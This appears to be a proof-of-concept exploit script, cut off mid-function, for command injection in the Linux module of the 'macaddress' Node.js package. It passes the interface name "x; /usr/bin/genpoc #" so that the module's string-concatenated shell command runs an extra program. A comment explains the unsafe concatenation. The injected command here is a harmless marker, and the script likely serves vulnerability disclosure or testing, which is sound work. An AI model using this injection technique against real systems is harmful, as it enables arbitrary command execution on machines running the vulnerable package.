```js
const macLinux = require('macaddress/lib/linux');

async function exploit() {
   // The vulnerable 'lib/linux.js' module constructs a shell command by directly concatenating
   // the untrusted 'iface' parameter: exec("cat /sys/class/net/" + iface + "/address", ...)
   const maliciousIface = "x; /usr/bin/genpoc #";

   macLinux(maliciousIface, function (err, res) {
      if (err) throw err; // Exception propagates naturally for visibility
      console.log('PoC verified: /usr/bin/genpoc was executed via command injection.');
